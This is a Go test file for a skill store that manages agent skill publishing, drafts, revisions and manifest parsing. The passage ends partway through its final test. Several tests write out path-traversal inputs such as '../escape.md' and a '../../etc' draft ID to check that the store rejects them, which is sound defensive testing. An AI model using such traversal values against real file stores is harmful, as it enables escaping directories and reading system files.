package skillstore

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
)

// One-level references: SKILL.md may link to files under the resource dirs,
// resource files may not chain to further tree files, and links must resolve
// to files that exist (R7.1/D1 lint).
func TestPublishRejectsBrokenOrChainedRefs(t *testing.T) {
	s := newStore(t, ScopeUser)
	head := "---\nname: demo\ndescription: \"d\"\n---\n\n"
	bad := map[string]Tree{
		"missing-ref": skillTree("[guide](references/missing.md)"),
		"deep-ref":    skillTree("[guide](references/deep/nested.md)"),
		"escape":      skillTree("[guide](../other/x.md)"),
		"chained": {
			SkillFile:         File{Data: []byte(head + "[guide](references/a.md)")},
			"references/a.md": File{Data: []byte("see [next](references/b.md)")},
			"references/b.md": File{Data: []byte("leaf")},
		},
	}
	for name, tree := range bad {
		if _, err := s.Publish("demo", tree, IndexMeta{Author: "u", Source: "user"}); err == nil {
			t.Fatalf("%s: lint must reject", name)
		}
	}
	ok := Tree{
		SkillFile:         File{Data: []byte(head + "[guide](references/a.md) and [docs](https://example.com) and [top](#top)")},
		"references/a.md": File{Data: []byte("[ext](https://example.com) and [anchor](#a)")},
	}
	if _, err := s.Publish("demo", ok, IndexMeta{Author: "u", Source: "user"}); err != nil {
		t.Fatalf("valid tree rejected: %v", err)
	}
}

func newStore(t *testing.T, scope Scope) *Store {
	t.Helper()
	s, err := Open(filepath.Join(t.TempDir(), "skills"), scope)
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	return s
}

func skillTree(body string) Tree {
	return Tree{SkillFile: File{Data: []byte("---\nname: demo\ndescription: \"Use when testing.\"\n---\n\n" + body)}}
}

// TestPublishLifecycle covers the R2.* write path: publish -> read back ->
// identical save is a no-op -> stale base conflicts -> rollback -> archive ->
// restore.
func TestPublishLifecycle(t *testing.T) {
	s := newStore(t, ScopeUser)
	rev1, err := s.Publish("demo", skillTree("v1"), IndexMeta{Author: "user", Source: "user"})
	if err != nil {
		t.Fatalf("publish: %v", err)
	}
	if names, _ := s.Names(); len(names) != 1 || names[0] != "demo" {
		t.Fatalf("names: %v", names)
	}
	m, rev, err := s.Manifest("demo")
	if err != nil || m.Name != "demo" || m.Description == "" || rev != rev1 {
		t.Fatalf("manifest %+v rev %q", m, rev)
	}
	// Identical save must not churn a revision.
	if rev2, err := s.Publish("demo", skillTree("v1"), IndexMeta{Author: "u"}); err != nil || rev2 != rev1 {
		t.Fatalf("identical save: rev2=%q err=%v", rev2, err)
	}
	// Stale base revision conflicts; matching base applies.
	if _, err := s.Publish("demo", skillTree("v2"), IndexMeta{Author: "u", BaseRevision: "bogus"}); !errors.Is(err, ErrConflict) {
		t.Fatalf("want ErrConflict, got %v", err)
	}
	rev2, err := s.Publish("demo", skillTree("v2"), IndexMeta{Author: "u", BaseRevision: rev1})
	if err != nil {
		t.Fatalf("matching base must apply: %v", err)
	}
	// Rollback restores the retained previous revision.
	if back, err := s.Rollback("demo", rev1); err != nil || back != rev1 {
		t.Fatalf("rollback: %q %v", back, err)
	}
	if tree, _ := s.Tree("demo"); !strings.Contains(string(tree[SkillFile].Data), "v1") {
		t.Fatal("rollback did not restore v1 content")
	}
	// Archive removes from live listing; restore brings it back.
	if err := s.Archive("demo", "unused", "", "owner"); err != nil {
		t.Fatalf("archive: %v", err)
	}
	if names, _ := s.Names(); len(names) != 0 {
		t.Fatalf("archived still listed: %v", names)
	}
	if err := s.Restore("demo"); err != nil {
		t.Fatalf("restore: %v", err)
	}
	if names, _ := s.Names(); len(names) != 1 {
		t.Fatalf("restored not listed: %v", names)
	}
	_ = rev2
}

// TestNameValidation covers R2.2/R2.8: strict name shape and the
// platform-only hermes-hub-* reservation.
func TestNameValidation(t *testing.T) {
	for _, bad := range []string{"Bad", "a_b", "-lead", "trail-", "a--b", "", "x"} {
		if ValidName(bad) != (bad == "x") {
			t.Fatalf("ValidName(%q) wrong", bad)
		}
	}
	for _, scope := range []Scope{ScopeUser, ScopeOrg} {
		s := newStore(t, scope)
		if _, err := s.Publish("hermes-hub-evil", skillTree("x"), IndexMeta{Author: "u"}); !errors.Is(err, ErrReserved) {
			t.Fatalf("scope %s: want ErrReserved, got %v", scope, err)
		}
		if _, err := s.Publish("BAD NAME", skillTree("x"), IndexMeta{Author: "u"}); !errors.Is(err, ErrInvalid) {
			t.Fatalf("scope %s: want ErrInvalid, got %v", scope, err)
		}
	}
	s := newStore(t, ScopePlatform)
	tree := skillTree("x")
	tree[SkillFile] = File{Data: []byte("---\nname: hermes-hub-ok\ndescription: \"Use when testing.\"\n---\n")}
	if _, err := s.Publish("hermes-hub-ok", tree, IndexMeta{Author: "op", Source: "platform"}); err != nil {
		t.Fatalf("platform may publish reserved name: %v", err)
	}
}

// TestTreeSafety covers R2.3/R2.4/R4.5: path traversal and symlinks are
// rejected, dot-entries are hub-private, quotas bind and the exec bit
// survives a round trip.
func TestTreeSafety(t *testing.T) {
	s := newStore(t, ScopeUser)

	evil := skillTree("x")
	evil["../escape.md"] = File{Data: []byte("no")}
	if _, err := s.Publish("demo", evil, IndexMeta{Author: "u"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("traversal: want ErrInvalid, got %v", err)
	}
	evil2 := skillTree("x")
	evil2["references/../../x.md"] = File{Data: []byte("no")}
	if _, err := s.Publish("demo", evil2, IndexMeta{Author: "u"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("nested traversal: want ErrInvalid, got %v", err)
	}
	evil3 := skillTree("x")
	evil3[".hidden.md"] = File{Data: []byte("no")}
	if _, err := s.Publish("demo", evil3, IndexMeta{Author: "u"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("dotfile: want ErrInvalid, got %v", err)
	}

	big := skillTree("x")
	big["assets/huge.bin"] = File{Data: make([]byte, MaxFileBytes+1)}
	if _, err := s.Publish("demo", big, IndexMeta{Author: "u"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("file quota: want ErrQuota, got %v", err)
	}
	many := skillTree("x")
	for i := 0; i < MaxFiles; i++ {
		many[fmt.Sprintf("f%04d.md", i)] = File{Data: []byte("x")}
	}
	if _, err := s.Publish("demo", many, IndexMeta{Author: "u"}); !errors.Is(err, ErrQuota) {
		t.Fatalf("count quota: want ErrQuota, got %v", err)
	}

	// Symlinks on disk never enter a loaded tree.
	dir := s.dir("demo")
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, SkillFile), []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link.md")
	if err := os.Symlink(filepath.Join(dir, SkillFile), link); err == nil {
		if _, err := s.Tree("demo"); !errors.Is(err, ErrInvalid) {
			t.Fatalf("symlink: want ErrInvalid, got %v", err)
		}
		if err := os.Remove(link); err != nil {
			t.Fatal(err)
		}
	} else {
		t.Logf("symlink unavailable: %v", err)
	}

	// Exec bit survives publish -> load round trip. Script-bearing trees
	// publish only through the draft+approve path (R4.4).
	withExec := skillTree("x")
	withExec["scripts/run.sh"] = File{Data: []byte("#!/bin/sh\n"), Exec: true}
	execDraft, err := s.CreateDraft("demo", withExec, DraftMeta{Author: "u", Reason: "exec test"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.PublishDraft(execDraft.ID, "operator:u"); err != nil {
		t.Fatal(err)
	}
	loaded, err := s.Tree("demo")
	if err != nil || !loaded["scripts/run.sh"].Exec {
		t.Fatalf("exec bit lost: %v", err)
	}
	if runtime.GOOS != "windows" {
		if fi, err := os.Stat(filepath.Join(dir, "scripts", "run.sh")); err != nil || fi.Mode().Perm()&0o111 == 0 {
			t.Fatalf("exec bit not on disk: %v", err)
		}
	}
}

// TestDraftLifecycle covers R2.6/R4.4: drafts are never active, carry
// provenance metadata, publish through approval and reject cleanly.
func TestDraftLifecycle(t *testing.T) {
	s := newStore(t, ScopeUser)

	d, err := s.CreateDraft("demo", skillTree("v1"), DraftMeta{
		Author: "agent", SessionID: "sess-1", Reason: "learned",
		Tainted: true, TaintSources: []string{"web"},
	})
	if err != nil {
		t.Fatalf("create draft: %v", err)
	}
	if names, _ := s.Names(); len(names) != 0 {
		t.Fatalf("draft must never be active: %v", names)
	}
	drafts, err := s.Drafts()
	if err != nil || len(drafts) != 1 || drafts[0].ID != d.ID {
		t.Fatalf("drafts: %v %+v", err, drafts)
	}
	got, tree, err := s.LoadDraft(d.ID)
	if err != nil {
		t.Fatalf("load draft: %v", err)
	}
	if !got.Meta.Tainted || len(got.Meta.TaintSources) != 1 || got.Meta.SessionID != "sess-1" || got.Meta.Author != "agent" {
		t.Fatalf("metadata lost: %+v", got.Meta)
	}
	if tree == nil || len(tree[SkillFile].Data) == 0 {
		t.Fatal("draft tree missing")
	}
	if _, err := s.CreateDraft("hermes-hub-x", skillTree("y"), DraftMeta{Author: "agent"}); !errors.Is(err, ErrReserved) {
		t.Fatalf("reserved draft: want ErrReserved, got %v", err)
	}
	evil := skillTree("x")
	evil["../escape.md"] = File{Data: []byte("no")}
	if _, err := s.CreateDraft("demo", evil, DraftMeta{Author: "agent"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("draft traversal: want ErrInvalid, got %v", err)
	}
	if _, _, err := s.LoadDraft("../../etc"); !errors.Is(err, ErrInvalid) {
		t.Fatalf("draft id traversal: want ErrInvalid, got %v", err)
	}
	if err := s.RejectDraft("../x"); !errors.Is(err, ErrInvalid) {
		t.Fatalf("reject id traversal: want ErrInvalid, got %v", err)
	}

	// Publish applies the draft; reject removes without touching live.
	rev, err := s.PublishDraft(d.ID, "owner")
	if err != nil || rev == "" {
		t.Fatalf("publish draft: %v %q", err, rev)
	}
	if names, _ := s.Names(); len(names) != 1 {
		t.Fatalf("published draft not live: %v", names)
	}
	if drafts, _ := s.Drafts(); len(drafts) != 0 {
		t.Fatal("draft not consumed after publish")
	}

	d2, err := s.CreateDraft("demo", skillTree("v2"), DraftMeta{Author: "agent", BaseRevision: "stale"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.PublishDraft(d2.ID, "owner"); !errors.Is(err, ErrConflict) {
		t.Fatalf("stale base: want ErrConflict, got %v", err)
	}
	if err := s.RejectDraft(d2.ID); err != nil {
		t.Fatalf("reject: %v", err)
	}
	if drafts, _ := s.Drafts(); len(drafts) != 0 {
		t.Fatal("rejected draft still listed")
	}
}

// TestEffectiveView covers R2.7-R2.9: precedence platform > org > user >
// hermes, collision notices for the hidden owner, reserved-name shadow
// blocking, a content-derived catalog revision and no hub-private state
// in the agent-visible output.
func TestEffectiveView(t *testing.T) {
	user := newStore(t, ScopeUser)
	org := newStore(t, ScopeOrg)
	platform := newStore(t, ScopePlatform)

	mustPub := func(s *Store, name, desc string) {
		t.Helper()
		tr := Tree{SkillFile: File{Data: []byte("---\nname: " + name + "\ndescription: \"" + desc + "\"\n---\nbody")}}
		if _, err := s.Publish(name, tr, IndexMeta{Author: "x", Source: string(s.Scope())}); err != nil {
			t.Fatalf("seed %s: %v", name, err)
		}
	}
	mustPub(user, "shared", "user shared")
	mustPub(user, "mine", "user only")
	mustPub(org, "shared", "org shared")
	mustPub(platform, "hermes-hub-core", "platform core")

	// A reserved name written out-of-band into a lower store must still be
	// blocked from the view (Publish itself also rejects it).
	fake := filepath.Join(user.Root(), "hermes-hub-fake")
	if err := os.MkdirAll(fake, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(fake, SkillFile), []byte("---\nname: hermes-hub-fake\ndescription: \"shadow\"\n---\n"), 0644); err != nil {
		t.Fatal(err)
	}

	sources := []Source{
		{Name: "platform", Dir: platform.Root()},
		{Name: "org", Dir: org.Root()},
		{Name: "user", Dir: user.Root()},
	}
	dest := filepath.Join(t.TempDir(), "effective")
	idx, err := Build(dest, sources)
	if err != nil {
		t.Fatalf("build: %v", err)
	}

	byName := map[string]Entry{}
	for _, e := range idx.Skills {
		byName[e.Name] = e
	}
	if byName["shared"].Source != "org" || byName["shared"].Description != "org shared" {
		t.Fatalf("org must win: %+v", byName["shared"])
	}
	if byName["mine"].Source != "user" {
		t.Fatalf("user skill missing: %+v", byName)
	}
	if _, ok := byName["hermes-hub-fake"]; ok {
		t.Fatal("user hermes-hub-* must not enter the view")
	}
	if byName["hermes-hub-core"].Source != "platform" {
		t.Fatal("platform skill missing")
	}
	if _, err := os.Stat(filepath.Join(dest, "shared", SkillFile)); err != nil {
		t.Fatalf("effective tree missing: %v", err)
	}
	if body, _ := os.ReadFile(filepath.Join(dest, "shared", SkillFile)); !strings.Contains(string(body), "org shared") {
		t.Fatal("effective tree must contain the org copy")
	}
	if _, err := os.Stat(filepath.Join(dest, "index.json")); err != nil {
		t.Fatalf("index.json missing: %v", err)
	}

	// Collision + reserved notices surface for the losing owner.
	var coll, res bool
	for _, n := range idx.Notices {
		if n.Kind == "collision" && n.Name == "shared" && n.HiddenBySource == "org" {
			coll = true
		}
		if n.Kind == "reserved" && n.Name == "hermes-hub-fake" {
			res = true
		}
	}
	if !coll || !res {
		t.Fatalf("notices missing: %+v", idx.Notices)
	}

	// Catalog revision tracks the effective set.
	idx2, err := Build(filepath.Join(t.TempDir(), "e2"), []Source{{Name: "user", Dir: user.Root()}})
	if err != nil {
		t.Fatal(err)
	}
	if idx.Revision == "" || idx.Revision == idx2.Revision {
		t.Fatal("catalog revision must track the effective skill set")
	}

	// Hub-private state never leaks into the view.
	for _, priv := range []string{".drafts", ".revisions", ".archive", ".state", ".sources"} {
		if _, err := os.Stat(filepath.Join(dest, priv)); !os.IsNotExist(err) {
			t.Fatalf("private %s leaked into effective view", priv)
		}
	}

	// HigherTierHas answers the same-scope collision question.
	if by, ok := HigherTierHas(sources, "shared", 2); !ok || by != "org" {
		t.Fatalf("want org hit, got %q %v", by, ok)
	}
	if _, ok := HigherTierHas(sources, "mine", 2); ok {
		t.Fatal("same-tier name must not count")
	}
}

// Index entries carry the disclosure metadata the catalog filters on:
// tags/platforms/requires for readiness, hidden flags for implicit
// visibility; ApplyReadiness stamps eligible+missing from the caller's caps.
func TestIndexReadinessMetadata(t *testing.T) {
	user := newStore(t, ScopeUser)
	front := func(name string, extra string) Tree {
		return Tree{SkillFile: File{Data: []byte("---\nname: " + name + "\ndescription: d-" + name + "\n" + extra + "---\nbody")}}
	}
	must := func(name, extra string) {
		if _, err := user.Publish(name, front(name, extra), IndexMeta{Author: "x", Source: "user"}); err != nil {
			t.Fatal(err)
		}
	}
	must("needs-terminal", "tags: [ops, shell]\nplatforms: [linux]\nrequires:\n  toolsets: [terminal]\n  connectors: [gitlab]\n")
	must("needs-web", "requires:\n  toolsets: [web]\n")
	must("quiet", "disable-model-invocation: true\n")
	must("implicit-off", "allow_implicit_invocation: false\n")
	must("wrong-os", "platforms: [windows]\n")

	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: user.Root()}})
	if err != nil {
		t.Fatal(err)
	}
	byName := map[string]Entry{}
	for _, e := range idx.Skills {
		byName[e.Name] = e
	}
	if got := byName["needs-terminal"].Tags; len(got) != 2 || got[0] != "ops" {
		t.Fatalf("tags: %+v", byName["needs-terminal"])
	}
	if got := byName["needs-terminal"].Requires.Toolsets; len(got) != 1 || got[0] != "terminal" {
		t.Fatalf("requires.toolsets: %+v", byName["needs-terminal"].Requires)
	}
	if !byName["quiet"].Hidden || !byName["implicit-off"].Hidden {
		t.Fatalf("hidden flags: quiet=%v implicit-off=%v", byName["quiet"].Hidden, byName["implicit-off"].Hidden)
	}

	preRevision := idx.Revision
	idx.ApplyReadiness(Capabilities{
		Toolsets:   map[string]bool{"terminal": true},
		Connectors: map[string]bool{},
		Platform:   "linux",
	})
	if idx.Revision == preRevision {
		t.Fatal("readiness changes what the catalog shows — revision must move (R6.3)")
	}
	if by := map[string]Entry{}; true {
		for _, e := range idx.Skills {
			by[e.Name] = e
		}
		if by["needs-terminal"].Eligible || len(by["needs-terminal"].Missing) != 1 {
			t.Fatalf("needs-terminal should miss connector: %+v", by["needs-terminal"])
		}
		if by["needs-web"].Eligible || len(by["needs-web"].Missing) != 1 {
			t.Fatalf("needs-web must miss its toolset: %+v", by["needs-web"])
		}
		if !by["quiet"].Eligible || !by["implicit-off"].Eligible {
			t.Fatal("hidden flags do not affect eligibility")
		}
		if by["wrong-os"].Eligible || len(by["wrong-os"].Missing) != 1 {
			t.Fatalf("wrong-os must be ineligible: %+v", by["wrong-os"])
		}
	}
}

// TestBuildFailsOnMalformedSkill covers fail-closed view construction: a
// broken SKILL.md anywhere in a source fails the whole build so the runtime
// never sees a half-rendered catalog.
func TestBuildFailsOnMalformedSkill(t *testing.T) {
	user := newStore(t, ScopeUser)
	bad := filepath.Join(user.Root(), "broken")
	if err := os.MkdirAll(bad, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(bad, SkillFile), []byte("no frontmatter at all"), 0644); err != nil {
		t.Fatal(err)
	}
	if _, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: user.Root()}}); err == nil {
		t.Fatal("malformed skill must fail the build")
	}
}

// TestManifestAndRevisions covers the read surface: manifest lookup,
// revision retention after a republish, and unknown-name failure.
func TestManifestAndRevisions(t *testing.T) {
	s := newStore(t, ScopeUser)
	v1 := Tree{SkillFile: File{Data: []byte("---\nname: doc\ndescription: \"v1\"\n---\n")}}
	v2 := Tree{SkillFile: File{Data: []byte("---\nname: doc\ndescription: \"v2\"\n---\n")}}
	r1, err := s.Publish("doc", v1, IndexMeta{Author: "u", Source: "user"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Publish("doc", v2, IndexMeta{Author: "u", Source: "user"}); err != nil {
		t.Fatal(err)
	}
	m, rev, err := s.Manifest("doc")
	if err != nil || m.Description != "v2" {
		t.Fatalf("manifest: %v %+v", err, m)
	}
	if rev == "" || rev == r1 {
		t.Fatalf("second publish must move revision: %q", rev)
	}
	revs, err := s.Revisions("doc")
	if err != nil || len(revs) != 1 || revs[0] != r1 {
		t.Fatalf("retained revisions: %v %v", revs, err)
	}
	if _, _, err := s.Manifest("missing"); err == nil {
		t.Fatal("manifest for unknown skill must fail")
	}
}

// TestArchiveRestoreEdges covers archive/restore error edges: missing skill,
// empty archive, and restore over a live skill are all refused.
func TestArchiveRestoreEdges(t *testing.T) {
	s := newStore(t, ScopeUser)
	if err := s.Archive("ghost", "x", "", "u"); !errors.Is(err, ErrNotFound) {
		t.Fatalf("archive missing: %v", err)
	}
	if err := s.Restore("ghost"); !errors.Is(err, ErrNotFound) {
		t.Fatalf("restore without archive: %v", err)
	}
	tree := Tree{SkillFile: File{Data: []byte("---\nname: keep\ndescription: \"d\"\n---\n")}}
	if _, err := s.Publish("keep", tree, IndexMeta{Author: "u", Source: "user"}); err != nil {
		t.Fatal(err)
	}
	if err := s.Restore("keep"); !errors.Is(err, ErrConflict) {
		t.Fatalf("restore over live must conflict: %v", err)
	}
	if err := s.Archive("keep", "done", "", "u"); err != nil {
		t.Fatal(err)
	}
	if err := s.Archive("keep", "again", "", "u"); !errors.Is(err, ErrNotFound) {
		t.Fatalf("double archive: %v", err)
	}
	if err := s.Restore("keep"); err != nil {
		t.Fatal(err)
	}
}

// TestPublishStaleBaseAndNoop covers optimistic-concurrency rules: a stale
// BaseRevision conflicts, and re-publishing identical content is a no-op
// that keeps the same revision.
func TestPublishStaleBaseAndNoop(t *testing.T) {
	s := newStore(t, ScopeUser)
	tree := Tree{SkillFile: File{Data: []byte("---\nname: c\ndescription: \"d\"\n---\n")}}
	r1, err := s.Publish("c", tree, IndexMeta{Author: "u", Source: "user"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Publish("c", Tree{SkillFile: File{Data: []byte("---\nname: c\ndescription: \"changed\"\n---\n")}}, IndexMeta{Author: "u", Source: "user", BaseRevision: "stale"}); !errors.Is(err, ErrConflict) {
		t.Fatalf("stale base must conflict: %v", err)
	}
	r2, err := s.Publish("c", tree, IndexMeta{Author: "u", Source: "user"})
	if err != nil || r2 != r1 {
		t.Fatalf("identical save must be a no-op on the same revision: %q vs %q", r1, r2)
	}
}

// TestCorruptStateFailsClosed covers defensive reads: a broken .state/index.json
// or a broken .draft.json must surface an error, never silently drop state.
func TestCorruptStateFailsClosed(t *testing.T) {
	s := newStore(t, ScopeUser)
	if err := os.MkdirAll(filepath.Join(s.Root(), ".state"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(s.Root(), ".state", "index.json"), []byte("{not json"), 0600); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Index(); err == nil {
		t.Fatal("corrupt index must error")
	}
	if _, err := s.Publish("c", Tree{SkillFile: File{Data: []byte("---\nname: c\ndescription: \"d\"\n---\n")}}, IndexMeta{Author: "u", Source: "user"}); err == nil {
		t.Fatal("publish over corrupt index must error")
	}
	bad := filepath.Join(s.Root(), ".drafts", "baddraft")
	if err := os.MkdirAll(bad, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(bad, ".draft.json"), []byte("{nope"), 0600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := s.LoadDraft("baddraft"); err == nil {
		t.Fatal("corrupt draft meta must error")
	}
	if _, err := s.Drafts(); err == nil {
		t.Fatal("corrupt draft must fail listing")
	}
}

// TestConcurrentPublish covers R2.10: two processes racing the same skill
// serialize cleanly — no torn trees, no lost revision, no error.
func TestConcurrentPublish(t *testing.T) {
	root := filepath.Join(t.TempDir(), "skills")
	done := make(chan error, 2)
	for i := 0; i < 2; i++ {
		go func(i int) {
			s, err := Open(root, ScopeUser)
			if err != nil {
				done <- err
				return
			}
			tr := Tree{SkillFile: File{Data: []byte(fmt.Sprintf("---\nname: demo\ndescription: \"d\"\n---\nv%d", i))}}
			_, err = s.Publish("demo", tr, IndexMeta{Author: "u"})
			done <- err
		}(i)
	}
	for i := 0; i < 2; i++ {
		if err := <-done; err != nil {
			t.Fatalf("concurrent publish: %v", err)
		}
	}
	s, err := Open(root, ScopeUser)
	if err != nil {
		t.Fatal(err)
	}
	if names, _ := s.Names(); len(names) != 1 {
		t.Fatalf("want one live skill, got %v", names)
	}
	tree, err := s.Tree("demo")
	if err != nil || len(tree) == 0 {
		t.Fatalf("live tree unreadable after race: %v", err)
	}
}

// TestConcurrentWriteOps covers R2.10 beyond publish: archive/restore
// racing publishes must not corrupt the store.
func TestConcurrentWriteOps(t *testing.T) {
	root := filepath.Join(t.TempDir(), "skills")
	s0, err := Open(root, ScopeUser)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s0.Publish("demo", skillTree("v1"), IndexMeta{Author: "u"}); err != nil {
		t.Fatal(err)
	}
	done := make(chan error, 3)
	go func() {
		s, _ := Open(root, ScopeUser)
		done <- s.Archive("demo", "r", "", "a")
	}()
	go func() {
		s, _ := Open(root, ScopeUser)
		_, err := s.Publish("demo", skillTree("v2"), IndexMeta{Author: "u"})
		done <- err
	}()
	go func() {
		s, _ := Open(root, ScopeUser)
		done <- s.Restore("demo")
	}()
	for i := 0; i < 3; i++ {
		if err := <-done; err != nil && !errors.Is(err, ErrNotFound) && !errors.Is(err, ErrConflict) {
			t.Fatalf("raced write op: %v", err)
		}
	}
	// The store must still be coherent: either live or archived, never torn.
	if _, err := s0.Tree("demo"); err != nil && !errors.Is(err, ErrNotFound) {
		t.Fatalf("store corrupted: %v", err)
	}
	if names, _ := s0.Names(); len(names) > 1 {
		t.Fatalf("torn listing: %v", names)
	}
}

// TestParseManifest covers D2/R12.1: strict hub-authored validation,
// lenient foreign-skill reads with warnings, and compat-field folding.
func TestParseManifest(t *testing.T) {
	// Strict: name must equal directory, description required.
	if _, _, err := ParseSkillMD("demo", []byte("---\nname: other\ndescription: \"x\"\n---\nb"), false); err == nil {
		t.Fatal("strict must reject name/dir mismatch")
	}
	if _, _, err := ParseSkillMD("demo", []byte("---\nname: demo\n---\nb"), false); err == nil {
		t.Fatal("strict must reject missing description")
	}
	if _, _, err := ParseSkillMD("demo", []byte("no frontmatter"), true); err == nil {
		t.Fatal("must reject missing frontmatter")
	}
	over := "---\nname: demo\ndescription: \"" + strings.Repeat("x", 1025) + "\"\n---\nb"
	if _, _, err := ParseSkillMD("demo", []byte(over), true); err == nil {
		t.Fatal("must reject description >1024")
	}

	// Lenient: name mismatch warns but loads.
	m, warns, err := ParseSkillMD("dir", []byte("---\nname: other\ndescription: \"x\"\n---\nb"), true)
	if err != nil || m.Name != "other" || len(warns) == 0 {
		t.Fatalf("lenient: %+v warns=%v err=%v", m, warns, err)
	}

	// Compat folding: hermes requires/env vars, claude flags, platforms,
	// allowed-tools aliases.
	body := `---
name: compat
description: "Use when x."
platforms: [hermes, claude-code]
disable-model-invocation: true
user-invocable: false
argument-hint: "[path]"
allowed-tools: [Read]
allowed_tools: [Write]
required_environment_variables:
  - name: API_KEY
    prompt: "key?"
    required_for: "calls"
metadata:
  hermes:
    requires_toolsets: [web]
    requires_tools: [exec]
    fallback_for_toolsets: [search]
  openclaw:
    requires:
      bins: [jq]
      env: [TOKEN]
---`
	m, _, err = ParseSkillMD("compat", []byte(body), false)
	if err != nil {
		t.Fatalf("compat parse: %v", err)
	}
	if len(m.Platforms) != 2 || !m.DisableModelInvocation || m.ArgumentHint != "[path]" {
		t.Fatalf("claude fields lost: %+v", m)
	}
	if m.UserInvocable == nil || *m.UserInvocable != false {
		t.Fatalf("user-invocable lost: %+v", m.UserInvocable)
	}
	if len(m.AllowedTools) != 2 {
		t.Fatalf("allowed-tools aliases not merged: %v", m.AllowedTools)
	}
	if len(m.Requires.Toolsets) != 1 || m.Requires.Toolsets[0] != "web" ||
		len(m.Requires.Tools) != 1 || len(m.Requires.FallbackForToolsets) != 1 {
		t.Fatalf("hermes requires not folded: %+v", m.Requires)
	}
	if len(m.Requires.Credentials) != 2 || m.Requires.Credentials[0].Name != "API_KEY" || m.Requires.Credentials[1].Name != "TOKEN" {
		t.Fatalf("env requirements not folded: %+v", m.Requires.Credentials)
	}
	if len(m.Requires.Bins) != 1 || m.Requires.Bins[0] != "jq" {
		t.Fatalf("openclaw bins not folded: %+v", m.Requires.Bins)
	}
}

// R8.1: credential requirements normalize to requires.credentials[] from
// the cross-format fields; hub/broker-owned names are never declarable.
func TestParseCredentials(t *testing.T) {
	body := `---
name: creds
description: "d"
requires:
  credentials:
    - name: SKILL_API_KEY
      prompt: "key for the service"
      hard: true
    - STRIPE_TOKEN
  env: [LEGACY_ENV]
required_environment_variables:
  - name: SECONDARY_KEY
metadata:
  hermes:
    requires_env: [HERMES_DECLARED]
  openclaw:
    requires:
      env: [OC_ENV]
---`
	m, _, err := ParseSkillMD("creds", []byte(body), false)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]EnvRequirement{}
	for _, c := range m.Requires.Credentials {
		got[c.Name] = c
	}
	for _, name := range []string{"SKILL_API_KEY", "STRIPE_TOKEN", "LEGACY_ENV", "SECONDARY_KEY", "HERMES_DECLARED", "OC_ENV"} {
		if _, ok := got[name]; !ok {
			t.Fatalf("credential %q not folded: %+v", name, m.Requires.Credentials)
		}
	}
	if !got["SKILL_API_KEY"].Hard || got["SKILL_API_KEY"].Prompt == "" {
		t.Fatalf("hard/prompt lost: %+v", got["SKILL_API_KEY"])
	}
	if got["STRIPE_TOKEN"].Hard {
		t.Fatalf("bare string must not default hard")
	}
}

// metadata.hermes.config declares non-secret per-user settings (R8.4):
// object values carry description/default/prompt, bare strings fold to a
// default-only spec.
func TestParseSettingsConfig(t *testing.T) {
	body := `---
name: conf
description: "d"
metadata:
  hermes:
    config:
      MAX_RESULTS: {description: "cap on results", default: "10", prompt: "how many"}
      OUTPUT_DIR: "exports"
---`
	m, _, err := ParseSkillMD("conf", []byte(body), false)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]SettingSpec{}
	for _, s := range m.Settings {
		got[s.Key] = s
	}
	if got["MAX_RESULTS"].Default != "10" || got["MAX_RESULTS"].Description == "" || got["MAX_RESULTS"].Prompt == "" {
		t.Fatalf("setting spec lost: %+v", m.Settings)
	}
	if got["OUTPUT_DIR"].Default != "exports" {
		t.Fatalf("bare-string setting must fold to a default: %+v", got["OUTPUT_DIR"])
	}
}

// Reserved names belong to the hub and the broker: a skill declaring them
// is rejected, not laundered into a lease request (R8.1).
func TestParseCredentialsReservedNames(t *testing.T) {
	body := `---
name: creds
description: "d"
requires:
  credentials: [HUB_PRINCIPAL_ID]
---`
	if _, _, err := ParseSkillMD("creds", []byte(body), true); err == nil {
		t.Fatal("hub-owned env name must be rejected")
	}
	body = strings.Replace(body, "HUB_PRINCIPAL_ID", "BROKER_SIGNING_KEY", 1)
	if _, _, err := ParseSkillMD("creds", []byte(body), true); err == nil {
		t.Fatal("broker-owned env name must be rejected")
	}
}

// Declared settings ride the effective index so skill() can surface
// per-user values without re-parsing frontmatter (R8.4).
func TestBuildIndexCarriesSettings(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "src")
	if err := os.MkdirAll(filepath.Join(dir, "conf"), 0755); err != nil {
		t.Fatal(err)
	}
	fm := "---\nname: conf\ndescription: d\nmetadata:\n  hermes:\n    config:\n      MAX_RESULTS: {default: \"10\"}\n---\nbody"
	if err := os.WriteFile(filepath.Join(dir, "conf", "SKILL.md"), []byte(fm), 0644); err != nil {
		t.Fatal(err)
	}
	dest := filepath.Join(t.TempDir(), "eff")
	if _, err := Build(dest, []Source{{Name: "user", Dir: dir}}); err != nil {
		t.Fatal(err)
	}
	var idx EffectiveIndex
	body, err := os.ReadFile(filepath.Join(dest, "index.json"))
	if err != nil || json.Unmarshal(body, &idx) != nil {
		t.Fatalf("index unreadable: %v", err)
	}
